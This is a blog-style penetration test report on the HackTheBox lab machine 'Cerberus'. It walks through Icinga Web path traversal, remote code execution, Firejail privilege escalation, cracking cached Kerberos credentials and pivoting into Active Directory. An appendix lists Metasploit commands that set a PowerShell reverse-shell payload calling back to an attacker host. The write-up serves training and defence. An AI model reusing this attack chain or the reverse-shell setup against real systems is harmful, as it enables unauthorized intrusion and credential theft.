+++
date = '2025-02-26T05:04:43Z'
draft = false
title = 'Cerberus'
+++

# **Penetration Testing Report For Cerberus**

---

## **Prepared by:** **blackcaesar0/SYN**

**Date:** [2/25/2025]

---

# **1. Executive Summary**

## **Purpose**

The objective of this penetration test was to assess the security posture of the target system by identifying and exploiting vulnerabilities. The main goals included:

- Enumerating services and misconfigurations.
    
- Identifying security flaws in web applications, services, or system components.
    
- Exploiting vulnerabilities to gain unauthorized access.
    
- Escalating privileges to administrative control.
    
- Extracting sensitive information or flags as proof of exploitation.
    

---

## **Scope**

- **Targets:** 10.129.229.4, icinga.cerberus.local, dc.cerberus.local
    
- **Restrictions:**
    
    - **No Denial of Service (DoS/DDoS)** – Availability must not be impacted.
        
    - **No Attacks Against HackTheBox Infrastructure** – Testing is limited to the assigned CTF machine.
        

---

## **Key Findings**

- **Summary of vulnerabilities:**
    
    - **Path Traversal in Icinga Web** (CVE-2022-24715)
    - **Remote Code Execution via Web Exploit**
    - **Privilege Escalation via Firejail (CVE-2022-31214)**
    - **Kerberos Authentication with Cached Credentials**
    - **SAML Authentication Exploitation (CVE-2022-47966)**
- **Security posture:** The system has multiple critical vulnerabilities allowing full compromise.
- **Recommendations:** Implement strict access control, update vulnerable software, and monitor authentication mechanisms.

---

# **2. Approach**

## **Testing Methodology**

- **Type:** [Black Box]
- **Phases:**
    - Enumeration
    - Vulnerability Analysis
    - Exploitation
    - Privilege Escalation
    - Post-Exploitation
    - Reporting

## **Tools Used**

- **Nmap**, **Burp Suite**, **Subfinder**, **Wfuzz**, **Curl**, **Python**,**Ligolo-ng**, **Msfconsole**, **Chisel**, **Proxychains**, **Evil-WinRM**

---

# **3. Summary of Findings**


| **Finding Name**                   |**Severity Level**|     **Impact**                       | **Remediation Summary**            |
|------------------------------------|------------------|--------------------------------------|------------------------------------|
| Path Traversal in Icinga Web       | High             | Credential extraction                | Restrict access & update           |
| Remote Code Execution via Web      | High             | Full system compromise               | Patch affected components          |
| Privilege Escalation (Firejail)    | Critical         | Root access                          | Update Firejail or remove SUID     |
| Kerberos Cached Credentials        | High             | Lateral movement                     | Secure Kerberos authentication     |
| SAML Authentication Bypass         | Critical         | Compromise AD authentication         | Fix SAML implementation            |

---

# **4. Internal Network Compromise Walkthrough**

## **Attack Chain**

1. **Path Traversal on Icinga Web**
    - Exploited `icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd` to read sensitive files.
    - Retrieved database credentials: `matthew:IcingaWebPassword2023`.
2. **Remote Code Execution via Web Exploit**
    - Used CVE-2022-24715 PoC to exploit Icinga Web
    - Obtained a shell as `www-data`.
3. **Network Enumeration**
    - Identified subnet `172.16.22.0/28`.
    - Used a ping sweep script to detect live hosts.
4. **Privilege Escalation**
    - Discovered SUID binary `firejail` (CVE-2022-31214).
    - Used PoC to escalate to root inside the container.
5. **Container Escape**
    - Extracted cached Kerberos credentials from `/var/lib/sss/db`.
    - Cracked password: `14******`.
    - Utilized the initial shell access to deploy `ligolo-ng`, enabling a pivot to the internal network. This allowed access to `WinRM` via `evil-winrm`, granting access to locally running services on the main host.
6. **Active Directory Attack**
    - Identified ADSelfService Plus on port `9251`.
    - Used Metasploit module for CVE-2022-47966 to gain `NT AUTHORITY\SYSTEM`.

---

# **5. Exploitation Details**

## **Techniques Used**

- **Path Traversal:**
    - Exploited Icinga Web to read sensitive system files.
    - Extracted database credentials.
- **Remote Code Execution via Web Exploit:**
    - Exploited CVE-2022-24715 in Icinga Web 2 by creating SSH resource files in unintended directories, leading to arbitrary code execution and gaining a shell on the target system.
- **Privilege Escalation:**
    - Leveraged Firejail SUID binary exploit.
    - Extracted cached AD credentials and pivoted via WinRM.
- **SAML Authentication Bypass:**
    - Exploited ADSelfService Plus CVE-2022-47966 to gain SYSTEM access.

## **Tools Used**

- **Nmap** (port scanning)
- **Burp Suite** (web exploitation)
- **Msfconsole** (Metasploit for ADSelfService Plus)
- **Proxychains** (pivoting and lateral movement)
- **Chisel** (SOCKS5 proxy for internal access)
- **Ligolo-ng** (initial pivot tool)

---

# **6. Remediation Summary**

## **Short-Term Fixes**

- Patch vulnerable services (Icinga Web, Firejail, ADSelfService Plus).
- Restrict external access to Icinga Web and ADSelfService Plus.

## **Medium-Term Fixes**

- Harden SSSD configurations to prevent credential caching.
- Implement network segmentation.

## **Long-Term Fixes**

- Implement continuous monitoring and security audits.
- Enforce strong authentication and role-based access control.

---

# **7. Technical Findings Details**

## **Finding 1: Path Traversal in Icinga Web**

- **Description:** The web application allows unauthorized access to system files.
- **Security Impact:** Attackers can retrieve credentials and escalate privileges.
- **Affected Systems:** `icinga.cerberus.local`
- **Remediation Steps:** Apply latest security patches for Icinga Web.
- **External References:** [SonarSource Blog](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/)
- **Screenshots & PoC:** See attached appendix.

## **Finding 2: Remote Code Execution via Web Exploit**

- **Description:** The web application is vulnerable to Remote Code Execution (RCE) due to improper input validation.
- **Security Impact:** Attackers can execute arbitrary code on the server.
- **Affected Systems:** `icinga.cerberus.local`
- **Remediation Steps:** Update the web application and validate all user inputs.
- **External References:** [CVE-2022-24715](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24715)
- **Screenshots & PoC:** See attached appendix.

---

# **Conclusion**

- The system was successfully compromised through multiple vectors.
- Implementing patches, network segmentation, and monitoring are critical.
- Further security hardening is recommended for Active Directory and web applications.

---

# **Appendix**

- **Screenshots & PoC**
      
    ![nmap scaan](/static/cerberus/nmap_scan.png)
    ![path traversal](/static/cerberus/path_traversal.png)
    ![path traversal](/static/cerberus/getting_user_password_path_traversal.png)
    ![RCE](/static/cerberus/rce.png)
    ![shell](/static/cerberus/shell.png)
    ![priv esc](/static/cerberus/suid_enum.png)
    ![priv esc](/static/cerberus/privilege_escalation.png)
    ![root access](/static/cerberus/root.png)
    ![sssd cached creds](/static/cerberus/sssd_cached_creds.png)
    ![hash cracking](/static/cerberus/hash_cracking.png)
    ![user access windows](/static/cerberus/user.png)
    ![root windows](/static/cerberus/root_windows.png)

```bash
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set issuer_url http://dc.cerberus.local/adfs/services/trust
issuer_url => http://dc.cerberus.local/adfs/services/trust

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set guid 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
guid => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set payload cmd/windows/powershell_reverse_tcp
payload => cmd/windows/powershell_reverse_tcp

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set lhost 10.10.14.xx
lhost => 10.10.14.xx

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set rhosts 127.0.0.1
rhosts => 127.0.0.1

msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > run

``` 
- **References**
    - [SonarSource Blog](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/)
        
    - [CVE-2022-24715](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24715)
        
    - [CVE-2022-31214](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31214)
        
    - [CVE-2022-47966](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-47966)
        
